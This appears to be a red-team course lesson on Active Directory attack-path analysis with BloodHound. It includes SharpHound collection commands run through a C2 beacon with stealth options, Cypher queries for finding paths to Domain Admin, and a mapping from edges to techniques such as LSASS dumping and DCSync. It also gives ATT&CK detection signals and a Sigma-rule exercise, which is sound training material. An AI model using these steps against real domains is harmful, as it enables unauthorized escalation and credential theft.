---
title: "AD Attack Path Analysis — BloodHound, SharpHound, Cypher Queries"
tags: [red-team, active-directory, BloodHound, SharpHound, attack-path, Cypher,
  Neo4j, ATT&CK, T1087.002, T1069.002]
module: 08-RedTeam-02
day: 501
related_topics:
  - Milestone Day 500 (Day 500)
  - AD Attack Lab (Day 502)
  - Domain Dominance (Day 499)
  - Post-Exploitation Advanced (Day 497)
---

# Day 501 — AD Attack Path Analysis

> "Every network I have ever been in had a path to Domain Admin. Not because
> the defenders were incompetent — because Active Directory is a graph, and in
> any graph with enough edges, there is a path. BloodHound does not find
> vulnerabilities. It finds the graph. Your job is to walk the shortest path
> before the defender notices you are reading the map."
>
> — Ghost

---

## Goals

Understand BloodHound's architecture and data model.
Collect AD data with SharpHound and import it into BloodHound.
Use built-in and custom Cypher queries to identify attack paths.
Translate graph paths into an actionable red team plan.

**Prerequisites:** Day 500 (domain dominance), Day 497 (AD discovery basics),
Active Directory fundamentals.
**Time budget:** 5 hours.

---

## Part 1 — BloodHound Architecture

BloodHound is a graph database analysis tool built on Neo4j. It maps Active
Directory relationships as a graph and finds attack paths that would be
impossible to see from a flat list view.

```
Components:

SharpHound (collector)
  → Runs on a domain-joined host (any privilege level for basic collection)
  → Queries AD via LDAP for: users, groups, computers, GPOs, OUs, trusts
  → Queries SMB for: local admin rights, sessions
  → Queries LDAP for: ACLs, delegation settings
  → Outputs: JSON files (zipped)

Neo4j (graph database)
  → Stores nodes (users, groups, computers, GPOs) and edges (relationships)
  → Relationships: MemberOf, AdminTo, HasSession, CanRDP, AllowedToDelegate,
    GenericAll, GenericWrite, WriteDACL, Owns, ForceChangePassword, etc.

BloodHound UI
  → Visualises the graph
  → Runs Cypher queries against Neo4j
  → Built-in: "Shortest Path to Domain Admin", "Kerberoastable Users with Path"
```

### Data Model: What BloodHound Maps

```
Nodes:
  User, Group, Computer, Domain, GPO, OU

Key edges (relationships):
  MemberOf          → user/group is a member of a group
  AdminTo           → user/group has local admin on a computer
  HasSession        → user has an active session on a computer
  CanRDP            → user can RDP to a computer
  AllowedToDelegate → computer/user can delegate to a target (constrained)
  AllowedToAct      → resource-based constrained delegation (RBCD)
  GenericAll        → full control over an object (can change password, etc.)
  GenericWrite      → can write non-protected attributes
  WriteDACL         → can modify the DACL on an object
  WriteOwner        → can change the owner (then modify DACL)
  Owns              → owns the object (implicit GenericAll)
  ForceChangePassword → can change password without knowing current
  DCSync            → has DS-Replication-Get-Changes-All (from Part 1 Day 499)
```

---

## Part 2 — SharpHound Data Collection

```bash
# Via Sliver beacon (execute-assembly) or directly on a compromised host:

# Collect everything (recommended for a full picture):
[beacon] > execute-assembly /path/to/SharpHound.exe -c All --zipfilename corp_ad.zip

# Stealth options (reduces LDAP noise):
[beacon] > execute-assembly /path/to/SharpHound.exe -c DCOnly
# DCOnly: collects from DC via LDAP only — no SMB session enumeration
# Slower to map local admin but less noisy

# Time-delay collection (blend with business hours):
[beacon] > execute-assembly /path/to/SharpHound.exe -c All \
    --Loop --LoopDuration 02:00:00 --LoopInterval 00:05:00
# Collects every 5 minutes for 2 hours (catches transient sessions)

# Download the zip:
[beacon] > download corp_ad.zip
```

### Collection Noise Profile

```
Collection method     LDAP queries   SMB connections   Log visibility
─────────────────────────────────────────────────────────────────────
DCOnly                High           None              LDAP query logs
All (no sessions)     High           None              LDAP query logs
All (with sessions)   High           High              LDAP + SMB (Event 4624)
Stealth               Low (delay)    None              Minimal
```

---

## Part 3 — Importing Data and Navigation

```bash
# On attacker machine: start Neo4j and BloodHound
# Neo4j default: http://localhost:7474  user: neo4j  pass: neo4j (change on first run)
sudo neo4j start
./BloodHound --no-sandbox &

# In BloodHound UI:
# 1. Upload Data → select corp_ad.zip → import
# 2. After import: check node counts in the top-right stats panel
#    Users: X   Groups: Y   Computers: Z   ACLs: W
```

### Built-in Queries (the Starting Point)

```
Under "Queries" tab:

Analysis queries:
  Find all Domain Admins
  Find Shortest Paths to Domain Admins
  Find Principals with DCSync Rights
  Find Computers where Domain Users are Local Admin
  List all Kerberoastable Accounts
  Find Shortest Paths to Kerberoastable Users
  Find AS-REP Roastable Users (DontReqPreAuth)
  Find Shortest Paths from Kerberoastable Users to Domain Admins
  Find Constrained Delegation
  Find Unconstrained Delegation Computers
  Find Computers with Unsupported OSes
```

### Reading an Attack Path

```
Example path displayed in BloodHound:
  jsmith@CORP.LOCAL
    → MemberOf → IT_HELPDESK@CORP.LOCAL
      → AdminTo → WORKSTATION05.CORP.LOCAL
        → HasSession → svc_backup@CORP.LOCAL
          → MemberOf → BACKUP_OPERATORS@CORP.LOCAL
            → CanDCSync → CORP.LOCAL

Reading this path:
  1. jsmith is in IT_HELPDESK group
  2. IT_HELPDESK has local admin on WORKSTATION05
  3. svc_backup has an active session on WORKSTATION05
  4. If we get on WORKSTATION05 (via jsmith's admin rights), we can dump
     svc_backup's credentials from LSASS
  5. svc_backup is in BACKUP_OPERATORS which has DCSync rights
  6. DCSync → all domain hashes → Golden Ticket

Five hops. All legitimate AD relationships. No CVE required.
```

---

## Part 4 — Custom Cypher Queries

BloodHound runs Cypher queries against Neo4j. Custom queries find paths that
the built-in queries miss.

### Query Syntax Basics

```cypher
-- Find a node:
MATCH (n:User {name: "JSMITH@CORP.LOCAL"}) RETURN n

-- Find all edges between two nodes:
MATCH p=(u:User)-[r]->(c:Computer) RETURN p LIMIT 25

-- Shortest path:
MATCH (u:User {name: "JSMITH@CORP.LOCAL"}),
      (g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"}),
      p=shortestPath((u)-[*1..]->(g))
RETURN p
```

### Useful Custom Queries

```cypher
-- Find all users with a path to DA that are not in a tier-0 group:
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"}))
WHERE NOT u.name CONTAINS "ADMIN"
RETURN p

-- Find ACL abuse paths: who can GenericWrite on DA accounts?
MATCH (u)-[:GenericWrite]->(t:User)
WHERE t.admincount = true
RETURN u.name, t.name

-- Find all computers with unconstrained delegation (except DCs):
MATCH (c:Computer {unconstraineddelegation: true})
WHERE NOT c.name CONTAINS "DC"
RETURN c.name

-- Find users with constrained delegation:
MATCH (u)-[:AllowedToDelegate]->(c:Computer)
RETURN u.name, c.name

-- Find all objects that can WriteDACL on the domain object:
MATCH (n)-[:WriteDACL]->(d:Domain)
RETURN n.name, labels(n)

-- Find all AS-REP roastable users:
MATCH (u:User {dontreqpreauth: true})
RETURN u.name

-- Enumerate sessions on high-value computers:
MATCH (u:User)-[:HasSession]->(c:Computer)
WHERE c.name IN ["DC01.CORP.LOCAL", "FILESRV.CORP.LOCAL"]
RETURN u.name, c.name
```

---

## Part 5 — Attack Path Prioritisation

After running queries, you will have multiple paths. Prioritise:

```
Priority framework:

1. Shortest hop count (fewer steps = less noise, lower chance of interruption)
2. Credential type required (session stealing > hash > ticket > plaintext)
3. Detection risk per step (WMI < PsExec; LDAP < net commands)
4. Reliability (session-based paths depend on the user being logged in)

Path quality rating:
  Gold:   3 hops, no session dependency, Kerberos auth throughout
  Silver: 5 hops, one session dependency, mixed auth
  Bronze: 7+ hops, multiple session dependencies, NTLM auth

Document the top 3 paths before executing any. If path 1 fails or is burned,
move to path 2 without re-running SharpHound (it would be too noisy).
```

### Translating Graph Paths to Operations

```
For each edge in the path, know the exact technique:

MemberOf            → No action needed (it is the current state)
AdminTo             → WMI exec, PsExec, DCOM (choose based on noise)
HasSession          → Dump LSASS on that computer; extract the session token
AllowedToDelegate   → Request a TGS for the target using S4U2Self + S4U2Proxy
GenericAll/Write    → Change password, add to group, or set SPN for Kerberoast
WriteDACL           → Grant yourself DCSync rights, then DCSync
ForceChangePassword → Reset account password (LOUD — only if acceptable)
```

---

## ATT&CK Mapping

| Action | ATT&CK ID | Detection primary signal |
|---|---|---|
| SharpHound LDAP collection | T1087.002 | LDAP queries for group membership, SPNs |
| SharpHound SMB session enum | T1069.002 | SMB connection to multiple hosts |
| BloodHound path execution: ACL abuse | T1078.002 | Unusual DACL modification Event 5136 |
| Constrained delegation abuse | T1550.003 | S4U2Self + S4U2Proxy Kerberos events |

---

## Key Takeaways

1. BloodHound finds attack paths, not vulnerabilities. The paths are built from
   legitimate AD relationships that defenders configured intentionally. The fix
   is architectural, not patching.
2. The most dangerous paths are multi-hop and involve service account sessions.
   An IT helpdesk admin who has local admin on a box where a backup service
   account runs is a DA-reachable path — even if neither account is privileged
   in isolation.
3. Use `DCOnly` collection for stealth. It avoids SMB session enumeration, which
   generates network connections to every domain computer.
4. Custom Cypher queries are essential. Built-in queries find the obvious paths.
   Custom queries find the paths that only exist because of your specific
   environment's configuration mistakes.
5. Identify three attack paths before executing any. Real engagements hit dead
   ends. Having a planned fallback means you do not have to re-collect (and
   re-alert) mid-operation.

---

## Exercises

1. Collect AD data with SharpHound using `DCOnly` mode. Import into BloodHound.
   Run the built-in "Find Shortest Paths to Domain Admins" query. Document the
   top 3 paths with hop counts and edge types.
2. Write a custom Cypher query that finds all users who can `WriteDACL` on any
   group that has `AdminTo` rights on a DC. This is a two-hop path to escalation.
3. Identify any unconstrained delegation computers in the lab (excluding DCs).
   Explain the attack: how does unconstrained delegation lead to DA compromise?
4. Write a Sigma rule that detects SharpHound collection: LDAP queries for
   `(objectCategory=groupPolicyContainer)` and `(objectClass=trustedDomain)` in
   rapid succession from a non-DC source.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q501.1, Q501.2 …).

---

## Navigation

← Previous: [Day 500 — Milestone Day 500](../08-RedTeam-01/DAY-0500-Milestone-500-Days.md)
→ Next: [Day 502 — AD Attack Lab](DAY-0502-AD-Attack-Lab.md)
